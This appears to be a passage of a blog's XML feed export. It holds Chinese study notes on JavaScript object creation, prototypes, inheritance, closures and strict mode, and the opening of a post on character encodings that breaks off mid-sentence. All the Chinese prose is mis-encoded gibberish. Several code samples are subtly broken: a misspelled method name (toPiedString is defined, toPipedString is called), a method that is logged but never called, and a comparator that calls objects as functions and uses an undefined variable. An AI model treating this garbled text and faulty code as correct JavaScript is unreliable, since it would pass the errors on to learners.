class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age, job</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.job = job;</span><br><span class="line">  <span class="keyword">this</span>.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person(<span class="string">'Greg'</span>, <span class="number">27</span>, <span class="string">'Doctor'</span>);</span><br><span class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> Person(<span class="string">'Nicholas'</span>, <span class="number">29</span>, <span class="string">'Software Enginner'</span>);</span><br></pre></td></tr></table></figure></p><p>person1å’Œperson2åˆ†åˆ«ä¿å­˜ç€Personçš„ä¸åŒå®ä¾‹ã€‚è¿™ä¸¤ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªconstructoræ„é€ å‡½æ•°å±æ€§ï¼Œè¯¥å±æ€§æŒ‡å‘Personã€‚</p><p>ä½¿ç”¨<code>call()</code>æˆ–<code>apply()</code>åœ¨æŸä¸ªç‰¹æ®Šå¯¹è±¡çš„ä½œç”¨åŸŸä¸­è°ƒç”¨<code>Person()</code>å‡½æ•°ã€‚è¿™é‡Œæ˜¯åœ¨å¯¹è±¡oçš„ä½œç”¨åŸŸä¸­è°ƒç”¨ï¼Œå› æ­¤è°ƒç”¨åoå°±æ‹¥æœ‰äº†æ‰€æœ‰å±æ€§å’ŒsayName()æ–¹æ³•ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">Person.call(o, <span class="string">'Kristen'</span>, <span class="number">25</span>, <span class="string">'Nurse'</span>);</span><br><span class="line">o.sayName();   <span class="comment">// "Kristen"</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-2-åŸå‹æ¨¡å¼"><a href="#6-2-åŸå‹æ¨¡å¼" class="headerlink" title="6.2 åŸå‹æ¨¡å¼"></a>6.2 åŸå‹æ¨¡å¼</h4><p>æ¯ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ªprototypeå±æ€§ï¼Œè¿™ä¸ªå±æ€§æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªå¯¹è±¡ã€‚åŸå‹å¯¹è±¡çš„å¥½å¤„æ˜¯å¯ä»¥è®©æ‰€æœ‰å¯¹è±¡å®ä¾‹å…±äº«å®ƒæ‰€åŒ…å«çš„å±æ€§å’Œæ–¹æ³•ã€‚æ¢å¥è¯è¯´ï¼Œä¸å¿…åœ¨æ„é€ å‡½æ•°ä¸­å®šä¹‰å¯¹è±¡å®ä¾‹çš„ä¿¡æ¯ï¼Œè€Œæ˜¯å¯ä»¥å°†è¿™äº›ä¿¡æ¯ç›´æ¥æ·»åŠ åˆ°åŸå‹å¯¹è±¡ä¸­ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.name = <span class="string">'Nicholas'</span>;</span><br><span class="line">Person.prototype.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> Person();</span><br><span class="line">person.sayName(); <span class="comment">// "Nicholas"</span></span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/26/ã€ŠJavascripté«˜çº§ç¨‹åºè®¾è®¡ã€‹/3.png" style="max-width:500px"></p><p><br></p><ul><li><p>hasOwnProperty()<br>æ£€æµ‹ä¸€ä¸ªå±æ€§æ˜¯å­˜åœ¨äºå®ä¾‹ä¸­ï¼Œè¿˜æ˜¯å­˜åœ¨äºåŸå‹ä¸­ã€‚</p></li><li><p>inæ“ä½œç¬¦</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(person1.hasOwnProperty(<span class="string">"name"</span>));   <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"name"</span> <span class="keyword">in</span> person1);                <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p>æ›´ç®€æ´çš„å†™æ³•</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">  <span class="keyword">constructor</span> : Person,</span><br><span class="line">  name: 'Nicholas',</span><br><span class="line">  sayName: function()&#123;</span><br><span class="line">    alert(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>åŸå‹å¯¹è±¡çš„é—®é¢˜<br>ç”±äºnameå­˜åœ¨äºPerson.prototypeè€Œéperson1ä¸­ï¼Œå½“person1.nameè¢«ä¿®æ”¹æ—¶ï¼Œè¿™ä¸ªä¿®æ”¹ä¹Ÿä¼šé€šè¿‡person2.nameåæ˜ å‡ºæ¥ã€‚å› æ­¤æˆ‘ä»¬å¾ˆå°‘å•ç‹¬ä½¿ç”¨åŸå‹æ¨¡å¼ã€‚</p></li></ul><p><br></p><h4 id="6-3-ç»„åˆä½¿ç”¨æ„é€ å‡½æ•°æ¨¡å¼å’ŒåŸå‹æ¨¡å¼"><a href="#6-3-ç»„åˆä½¿ç”¨æ„é€ å‡½æ•°æ¨¡å¼å’ŒåŸå‹æ¨¡å¼" class="headerlink" title="6.3 ç»„åˆä½¿ç”¨æ„é€ å‡½æ•°æ¨¡å¼å’ŒåŸå‹æ¨¡å¼"></a>6.3 ç»„åˆä½¿ç”¨æ„é€ å‡½æ•°æ¨¡å¼å’ŒåŸå‹æ¨¡å¼</h4><p>æ„é€ å‡½æ•°æ¨¡å¼ç”¨äºå®šä¹‰å®ä¾‹å±æ€§ï¼Œè€ŒåŸå‹æ¨¡å¼ç”¨äºå®šä¹‰æ–¹æ³•å’Œå…±äº«çš„å±æ€§ã€‚ç»“æœï¼Œæ¯ä¸ªå®ä¾‹éƒ½æœ‰è‡ªå·±çš„ä¸€ä»½å®ä¾‹å±æ€§çš„å‰¯æœ¬ï¼Œä½†åŒæ—¶åˆå…±äº«ç€å¯¹æ–¹æ³•çš„å¼•ç”¨ï¼Œæœ€å¤§é™åº¦åœ°èŠ‚çœäº†å†…å­˜ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age, job</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.job = job;</span><br><span class="line">  <span class="keyword">this</span>.friends = [<span class="string">'Amy'</span>, <span class="string">'Mike'</span>];</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">  <span class="keyword">constructor</span>: Person,</span><br><span class="line">  sayName: function()&#123;</span><br><span class="line">    alert(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-4-å¯„ç”Ÿæ¨¡å¼"><a href="#6-4-å¯„ç”Ÿæ¨¡å¼" class="headerlink" title="6.4 å¯„ç”Ÿæ¨¡å¼"></a>6.4 å¯„ç”Ÿæ¨¡å¼</h4><p>å½“æˆ‘ä»¬æƒ³åˆ›å»ºä¸€ä¸ªå…·æœ‰é¢å¤–æ–¹æ³•çš„ç‰¹æ®Šæ•°ç»„ï¼Œç”±äºä¸èƒ½ç›´æ¥ä¿®æ”¹Arrayæ„é€ å‡½æ•°ï¼Œå› æ­¤å¯ä»¥ç”¨è¿™ä¸ªæ¨¡å¼ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SpecialArray</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> values = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">  <span class="comment">// æ·»åŠ å€¼</span></span><br><span class="line">  values.push.apply(values, <span class="built_in">arguments</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ·»åŠ æ–¹æ³•</span></span><br><span class="line">  values.toPiedString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.join(<span class="string">"|"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> values;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> colors = <span class="keyword">new</span> SpecialArray(<span class="string">"red"</span>, <span class="string">"blue"</span>, <span class="string">"green"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(colors.toPipedString());  <span class="comment">// "red|blue|green"</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="7-ç»§æ‰¿"><a href="#7-ç»§æ‰¿" class="headerlink" title="7. ç»§æ‰¿"></a>7. ç»§æ‰¿</h3><h4 id="7-1-åŸå‹é“¾"><a href="#7-1-åŸå‹é“¾" class="headerlink" title="7.1 åŸå‹é“¾"></a>7.1 åŸå‹é“¾</h4><p>è®©åŸå‹å¯¹è±¡ç­‰äºå¦ä¸€ä¸ªç±»çš„å®ä¾‹ã€‚åˆ›å»ºSuperTypeçš„å®ä¾‹ï¼Œå¹¶å°†å®ä¾‹èµ‹å€¼ç»™SubType.prototypeã€‚æœ¬è´¨æ˜¯é‡å†™åŸå‹å¯¹è±¡ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SuperTypeå®ä¾‹ä¸­çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œç°åœ¨å­˜åœ¨äºSubType.prototypeä¸­ã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.value = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SuperType.prototype.getSuperValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.subValue = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">SubType.prototype = <span class="keyword">new</span> SuperType();</span><br><span class="line">SubType.prototype.getSubValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.subValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> instance = <span class="keyword">new</span> SubType();</span><br><span class="line"><span class="built_in">console</span>.log(instance.getSuperValue); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p>ç•¥</p><p><br></p><h3 id="8-å‡½æ•°è¡¨è¾¾å¼"><a href="#8-å‡½æ•°è¡¨è¾¾å¼" class="headerlink" title="8. å‡½æ•°è¡¨è¾¾å¼"></a>8. å‡½æ•°è¡¨è¾¾å¼</h3><p>å®šä¹‰å‡½æ•°çš„æ–¹å¼æœ‰ä¸¤ç§<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å‡½æ•°å£°æ˜</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">functionName</span>(<span class="params">args</span>)</span>&#123;&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°è¡¨è¾¾å¼</span></span><br><span class="line"><span class="keyword">var</span> functionName = <span class="function"><span class="keyword">function</span>(<span class="params">args</span>)</span>&#123;&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="8-1-é—­åŒ…"><a href="#8-1-é—­åŒ…" class="headerlink" title="8.1 é—­åŒ…"></a>8.1 é—­åŒ…</h4><p><em>é—­åŒ…</em>æ˜¯æŒ‡æœ‰æƒè®¿é—®å¦ä¸€ä¸ªå‡½æ•°ä½œç”¨åŸŸä¸­çš„å˜é‡çš„å‡½æ•°ã€‚</p><p>åˆ›å»ºé—­åŒ…çš„å¸¸è§æ–¹å¼ï¼Œå°±æ˜¯åœ¨ä¸€ä¸ªå‡½æ•°å†…éƒ¨åˆ›å»ºå¦ä¸€ä¸ªå‡½æ•°ã€‚</p><p><code>var value1=</code>è¿™ä¸¤è¡Œä»£ç æ˜¯å†…éƒ¨å‡½æ•°ï¼ˆä¸€ä¸ªåŒ¿åå‡½æ•°ï¼‰çš„ä»£ç ï¼Œè¿™ä¸¤è¡Œä»£ç è®¿é—®äº†å¤–éƒ¨å‡½æ•°ä¸­çš„å˜é‡propertyNameã€‚å³ä½¿è¿™ä¸ªå†…éƒ¨å‡½æ•°è¢«è¿”å›äº†ï¼Œå®ƒä»ç„¶å¯ä»¥è®¿é—®å˜é‡propertyNameï¼Œä¹‹æ‰€ä»¥è¿˜èƒ½è®¿é—®è¿™ä¸ªå˜é‡ï¼Œæ˜¯å› ä¸ºå†…éƒ¨å‡½æ•°çš„ä½œç”¨åŸŸé“¾ä¸­åŒ…å«<code>createComparisonFunction()</code>çš„ä½œç”¨åŸŸã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createComparisonFunction</span>(<span class="params">propertyName</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">object1, object2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> value1 = object1(propertyName);</span><br><span class="line">    <span class="keyword">var</span> value2 = object2(propertyName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (value &lt; value2)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="9-use-strict"><a href="#9-use-strict" class="headerlink" title="9. use strict"></a>9. use strict</h3><p>ä½¿ç”¨ä¸¥æ ¼æ¨¡å¼ï¼Œå¯ä»¥å‡å°‘æ„å¤–åˆ›å»ºå…¨å±€å˜é‡ï¼Œå¯¼è‡´å†…å­˜æ³„éœ²çš„æƒ…å†µã€‚ä¸€äº›åœ¨æ­£å¸¸æ¨¡å¼ä¸‹å¯ä»¥è¿è¡Œçš„è¯­å¥ï¼Œåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹å°†ä¸èƒ½è¿è¡Œã€‚</p><table><thead><tr><th>æ­£å¸¸æ¨¡å¼</th><th style="text-align:right">ä¸¥æ ¼æ¨¡å¼</th></tr></thead><tbody><tr><td>å¦‚æœä¸€ä¸ªå˜é‡æ²¡æœ‰å£°æ˜å°±èµ‹å€¼ï¼Œé»˜è®¤æ˜¯å…¨å±€å˜é‡</td><td style="text-align:right">ä¸¥æ ¼æ¨¡å¼ç¦æ­¢è¿™ç§ç”¨æ³•ï¼Œå…¨å±€å˜é‡å¿…é¡»æ˜¾å¼å£°æ˜</td></tr><tr><td>å…è®¸åŠ¨æ€ç»‘å®šï¼Œå³æŸäº›å±æ€§å’Œæ–¹æ³•å±äºå“ªä¸€ä¸ªå¯¹è±¡ï¼Œä¸æ˜¯åœ¨ç¼–è¯‘æ—¶ç¡®å®šçš„ï¼Œè€Œæ˜¯åœ¨è¿è¡Œæ—¶ç¡®å®šçš„</td><td style="text-align:right">ä¸¥æ ¼æ¨¡å¼åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåªå…è®¸é™æ€ç»‘å®šï¼Œå±æ€§å’Œæ–¹æ³•å½’å±å“ªä¸ªå¯¹è±¡ï¼Œåœ¨ç¼–è¯‘é˜¶æ®µå°±ç¡®å®šã€‚<br>1. ç¦æ­¢ä½¿ç”¨withè¯­å¥<br>2. å¢åŠ evalä½œç”¨åŸŸ </td></tr><tr><td></td><td style="text-align:right">ç¦æ­¢thiså…³é”®å­—æŒ‡å‘å…¨å±€å¯¹è±¡ <br> <code>function f(){ &quot;use strict&quot;; this.a = 1; } f(); // æŠ¥é”™ï¼Œthisæœªå®šä¹‰</code></td></tr><tr><td></td><td style="text-align:right">ç¦æ­¢åˆ é™¤å˜é‡ï¼Œåªæœ‰configurableä¸ºtrueçš„å¯¹è±¡å±æ€§æ‰èƒ½è¢«åˆ é™¤ </td></tr><tr><td></td><td style="text-align:right">æ˜¾ç¤ºæŠ¥é”™ </td></tr><tr><td></td><td style="text-align:right">é‡åé”™è¯¯ï¼šå¯¹è±¡ã€å‡½æ•°å‚æ•°ä¸èƒ½æœ‰é‡åçš„å±æ€§ </td></tr><tr><td></td><td style="text-align:right">ç¦æ­¢å…«è¿›åˆ¶è¡¨ç¤ºæ³• <code>var n = 0100 // error</code></td></tr><tr><td></td><td style="text-align:right">ä¸å…è®¸å¯¹argumentsèµ‹å€¼ï¼Œargumentsä¸å†è¿½è¸ªå‚æ•°çš„å˜åŒ–, ç¦æ­¢ä½¿ç”¨arguments.callee</td></tr><tr><td></td><td style="text-align:right">æ–°ç‰ˆJSä¼šå¼•å…¥å—çº§ä½œç”¨åŸŸã€‚ä¸ºäº†ä¸æ–°ç‰ˆæœ¬æ¥è½¨ï¼Œä¸¥æ ¼æ¨¡å¼åªå…è®¸åœ¨å…¨å±€ä½œç”¨åŸŸï¼Œæˆ–å‡½æ•°ä½œç”¨åŸŸçš„é¡¶å±‚å£°æ˜å‡½æ•°ã€‚ä¸å…è®¸åœ¨éå‡½æ•°çš„ä»£ç å—å†…å£°æ˜å‡½æ•°ã€‚</td></tr><tr><td></td><td style="text-align:right">ä¿ç•™å­—ï¼Œimplements, interface, let, package, private, protected, public, static, yield, class, enum, export, extends, import, super, const ä½¿ç”¨è¿™äº›è¯ä½œä¸ºå˜é‡åå°†æŠ¥é”™</td></tr></tbody></table>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>å­—ç¬¦é›†å’Œå­—ç¬¦ç¼–ç  Charset &amp; Encoding</title>
      <link href="/2019/02/16/ASCII%EF%BC%8CUnicode%E5%92%8CUTF-8/"/>
      <url>/2019/02/16/ASCII%EF%BC%8CUnicode%E5%92%8CUTF-8/</url>
      <content type="html"><![CDATA[<p>ä¸€ç›´å¬è¯´<code>ASCII</code>, <code>Unicode</code>, <code>UTF-8</code>è¿™äº›è¯ï¼Œä½†æ˜¯ä¸çŸ¥é“å…·ä½“æ„æ€ã€‚ç—›å®šæ€ç—›ï¼Œå†³å®šæ€»ç»“ä¸€ä¸‹ã€‚<br><br></p><h3 id="1-å†å²æ¸Šæº"><a href="#1-å†å²æ¸Šæº" class="headerlink" title="1. å†å²æ¸Šæº"></a>1. å†å²æ¸Šæº</h3><h4 id="1-1-ASCIIç "><a href="#1-1-ASCIIç " class="headerlink" title="1.1 ASCIIç "></a>1.1 ASCIIç </h4><p>æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨è®¡ç®—æœºå†…éƒ¨ï¼Œæ‰€æœ‰çš„ä¿¡æ¯æœ€ç»ˆéƒ½è¡¨ç¤ºä¸ºä¸€ä¸ªäºŒè¿›åˆ¶çš„å­—ç¬¦ä¸²ã€‚æ¯ä¸€ä¸ªäºŒè¿›åˆ¶ä½(bit)æœ‰0å’Œ1ä¸¤ç§çŠ¶æ€ï¼Œå› æ­¤8ä¸ªäºŒè¿›åˆ¶ä½å¯ä»¥ç»„åˆå‡º<code>256</code>ä¸­çŠ¶æ€ï¼Œè¿™è¢«ç§°ä¸ºä¸€ä¸ªå­—èŠ‚(byte)ã€‚</p><p>ä¸Šä¸–çºª60å¹´ä»£ï¼Œç¾å›½åˆ¶å®šäº†ä¸€å¥—å­—ç¬¦ç¼–ç ï¼Œå¯¹è‹±è¯­å­—ç¬¦ä¸äºŒè¿›åˆ¶ä¹‹é—´çš„å…³ç³»ï¼Œåšäº†ç»Ÿä¸€è§„å®šã€‚è¿™è¢«ç§°ä¸º<code>ASCIIç (American Standard Code for Information Interchange)</code>ï¼Œä¸€ç›´æ²¿ç”¨è‡³ä»Šã€‚ASCIIç ä¸€å…±è§„å®šäº†128ä¸ªå­—ç¬¦çš„ç¼–ç ã€‚æ¯”å¦‚ç©ºæ ¼æ˜¯32(äºŒè¿›åˆ¶00100000)ï¼Œå¤§å†™çš„å­—æ¯Aæ˜¯65(äºŒè¿›åˆ¶01000001)ã€‚è¿™128ä¸ªç¬¦å·ï¼Œåªå ç”¨äº†ä¸€ä¸ªå­—èŠ‚çš„åé¢7ä½ï¼Œæœ€å‰é¢çš„1ä½ç»Ÿä¸€è§„å®šä¸º0ã€‚<br><br></p><h4 id="1-2-GBK"><a href="#1-2-GBK" class="headerlink" title="1.2 GBK"></a>1.2 GBK</h4><p>åæ¥ï¼Œä¸–ç•Œå„åœ°éƒ½å¼€å§‹ä½¿ç”¨è®¡ç®—æœºï¼Œä½†æ˜¯å¾ˆå¤šå›½å®¶ç”¨çš„ä¸æ˜¯è‹±æ–‡ï¼Œä»–ä»¬çš„å­—æ¯é‡Œæœ‰å¾ˆå¤šæ˜¯<code>ASCII</code>é‡Œæ²¡æœ‰çš„ã€‚ç­‰åˆ°ä¸­å›½äººæ°‘ç”¨è®¡ç®—æœºä¹‹åï¼Œå‘ç°æ²¡æœ‰ä¸­æ–‡æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>ä¸­å›½äººçš„è§£å†³æ–¹æ¡ˆæ˜¯ï¼šå°äº127å·çš„è¿˜æ˜¯ç»§ç»­ä½¿ç”¨ï¼Œå¹¶ä¸”ç”¨2ä¸ªå¤§äº127å­—èŠ‚è¡¨ç¤ºä¸€ä¸ªä¸­æ–‡å­—ç¬¦ã€‚åœ¨è¿™äº›ç¼–ç é‡Œï¼Œæˆ‘ä»¬è¿˜æŠŠæ•°å­¦ç¬¦å·ã€ç½—é©¬å¸Œè…Šçš„å­—æ¯ã€æ—¥æœ¬çš„å‡åä»¬éƒ½ç¼–è¿›å»äº†ï¼Œè¿åœ¨ASCIIé‡Œæœ¬æ¥å°±æœ‰çš„æ•°å­—ã€æ ‡ç‚¹ã€å­—æ¯éƒ½ç»Ÿç»Ÿé‡æ–°ç¼–äº†ä¸¤ä¸ªå­—èŠ‚é•¿çš„ç¼–ç ï¼Œè¿™å°±æ˜¯å¸¸è¯´çš„ <em>å…¨è§’</em> å­—ç¬¦ï¼Œè€ŒåŸæ¥åœ¨127å·ä»¥ä¸‹çš„é‚£äº›å°±å« <em>åŠè§’</em> å­—ç¬¦äº†ã€‚</p><p>è¿™å¥—ç¼–ç æ–¹æ¡ˆè¢«ç§°ä¸º<code>GBK</code>æ ‡å‡†ã€‚ä¸­å›½çš„ç¨‹åºå‘˜çœ‹åˆ°è¿™ä¸€ç³»åˆ—æ±‰å­—ç¼–ç çš„æ ‡å‡†æ˜¯å¥½çš„ï¼Œäºæ˜¯æŠŠå®ƒé€šç§°ä¸º<code>DBCS</code>(Double Byte Charecter Set åŒå­—èŠ‚å­—ç¬¦é›†)ã€‚<br><br></p><h4 id="1-3-Unicode"><a href="#1-3-Unicode" class="headerlink" title="1.3 Unicode"></a>1.3 Unicode</h4><p>ä½†æ˜¯æ¯ä¸ªå›½å®¶éƒ½æè‡ªå·±çš„å­—ç¬¦ç¼–ç ï¼Œè‡ªå·±åªèƒ½çœ‹è‡ªå·±ï¼Œåˆ«äººçš„çœ‹ä¸æ¥ï¼Œè¿™ä¸ç¬¦åˆwebå¼€æ”¾çš„æ–‡åŒ–å•Šã€‚</p><p>æ­£åœ¨è¿™æ—¶ä¸€ä¸ªå«ISOï¼ˆå›½é™…æ ‡å‡†åŒ–ç»„ç»‡ï¼‰çš„å›½é™…ç»„ç»‡å†³å®šè§£å†³è¿™ä¸ªé—®é¢˜ã€‚ä»–ä»¬é‡‡ç”¨çš„æ–¹æ³•å¾ˆç®€å•ï¼šåºŸäº†æ‰€æœ‰åœ°åŒºæ€§ç¼–ç æ–¹æ¡ˆï¼Œé‡æ–°æäº†ä¸€ä¸ªåŒ…æ‹¬äº†åœ°çƒä¸Šæ‰€æœ‰æ–‡åŒ–ã€æ‰€æœ‰å­—æ¯å’Œç¬¦å·çš„ç¼–ç ï¼ä»–ä»¬æ‰“ç®—å«å®ƒâ€Universal Multiple-Octet Coded Character Setâ€ï¼Œç®€ç§°UCS, ä¿—ç§°<code>Unicode</code>ã€‚</p><p><code>Unicode</code>å¼€å§‹åˆ¶å®šæ—¶ï¼Œè®¡ç®—æœºçš„å­˜å‚¨å™¨å®¹é‡æå¤§åœ°å‘å±•äº†ï¼Œç©ºé—´ä¸å†æˆä¸ºé—®é¢˜ã€‚äºæ˜¯ISOå°±ç›´æ¥è§„å®šå¿…é¡»ç”¨<strong>ä¸¤ä¸ªå­—èŠ‚</strong>ï¼Œ 16ä½æ¥ç»Ÿä¸€è¡¨ç¤ºæ‰€æœ‰çš„å­—ç¬¦ï¼Œå¯¹äºASCIIé‡Œé‚£äº›â€œåŠè§’å­—ç¬¦â€ï¼Œ ä¹Ÿå°†å…¶é•¿åº¦ç”±åŸæ¥çš„8ä½æ‰©å±•è‡³16ä½ã€‚è¿™ç§å¤§æ°”çš„æ–¹æ¡ˆä½¿å¾—ä¿å­˜è‹±æ–‡æ–‡æœ¬æ—¶ä¼šæµªè´¹å¤šä¸€å€çš„ç©ºé—´ã€‚</p><p><br></p><h4 id="1-4-UFT-8"><a href="#1-4-UFT-8" class="headerlink" title="1.4 UFT-8"></a>1.4 UFT-8</h4><p><strong>Unicodeæœ‰ä¸¤ä¸ªä¸¥é‡çš„é—®é¢˜</strong>: 1. æ€æ ·åŒºåˆ«Unicodeå’ŒASCIIï¼Ÿè®¡ç®—æœºæ€ä¹ˆçŸ¥é“2ä¸ªå­—èŠ‚ä¸º1ä¸ªå­—ç¬¦ï¼Œè¿˜æ˜¯1ä¸ªå­—èŠ‚ä¸º1ä¸ªå­—ç¬¦ã€‚2. è®¡ç®—æœºå¤§éƒ¨åˆ†å†…å®¹è¿˜æ˜¯è‹±æ–‡ï¼ŒUnicodeçš„ç¼–ç æ–¹å¼å¾ˆæµªè´¹ç©ºé—´ã€‚</p><p>Unicodeåœ¨å¾ˆé•¿ä¸€æ®µæ—¶é—´å†…æ— æ³•æ¨å¹¿ã€‚ç›´åˆ°äº’è”ç½‘çš„å‡ºç°ï¼Œå¼ºçƒˆè¦æ±‚å‡ºç°ç»Ÿä¸€çš„ç¼–ç 